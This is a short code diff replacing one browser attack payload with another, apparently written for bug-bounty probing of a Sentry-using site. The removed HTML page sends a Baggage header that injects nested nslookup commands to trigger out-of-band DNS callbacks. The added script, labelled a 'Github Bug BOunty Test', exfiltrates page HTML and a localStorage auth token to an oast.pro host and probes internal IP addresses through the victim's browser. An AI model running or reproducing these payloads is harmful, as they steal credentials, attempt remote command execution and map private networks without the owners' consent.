@@ -1,43 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Security Audit - RCE Probing</title>
-</head>
-<body>
-    <h1>System Audit in Progress...</h1>
-    
-    <script>
-        (function() {
-            // 1. Identify Target (The server that loaded this page)
-            const targetUrl = window.location.origin + "/"; 
-            const oobID = "d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro"; // REPLACE THIS
+// Github Bug BOunty Test
+(function() {
+    // 1. Exfiltrate the current page's HTML (reveals internal URLs/tokens)
+    fetch('https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/log?data=' + btoa(document.documentElement.innerHTML));
 
-            // 2. The "Soft RCE" Payload
-            // We inject backticks into the 'sentry-release' field.
-            // If the server parses this via a shell, it will trigger the DNS lookup.
-            const rcePayload = `sentry-environment=production,sentry-release=$(nslookup $(nslookup $(hostname).${d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro}),sentry-public_key=e6210d6b5d3246c29d5667b356d11c63`;
+    // 2. Attempt to grab the Sentry Auth Token from LocalStorage
+    var token = localStorage.getItem('auth:token');
+    if (token) { fetch('https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/token?val=' + token); }
 
-            console.log("Attempting RCE probe on: " + targetUrl);
-
-            // 3. Fire the Fetch Request
-            fetch(targetUrl, {
-                method: 'GET',
-                mode: 'no-cors', // Bypasses strict CORS for the request itself
-                headers: {
-                    'Baggage': rcePayload,
-                    'Sentry-Trace': '1234567890abcdef1234567890abcdef-1234567890abcdef-1'
-                }
-            })
-            .then(() => {
-                // 4. Success Log to your Collaborator
-                new Image().src = `https://${d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro}/fetch-sent?target=` + btoa(targetUrl);
-            })
-            .catch(err => {
-                // If the browser blocks custom headers, we log the failure
-                new Image().src = `https://${d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro}/fetch-blocked?err=` + btoa(err.message);
-            });
-        })();
-    </script>
-</body>
-</html>
+    // 3. Scan the internal network (using the victim's browser as a proxy)
+    var internalIPs = ['10.0.0.1', '192.168.1.1'];
+    internalIPs.forEach(ip => {
+        fetch('http://' + ip + '/admin').catch(e => console.log('Found internal host!'));
+    });
+})();
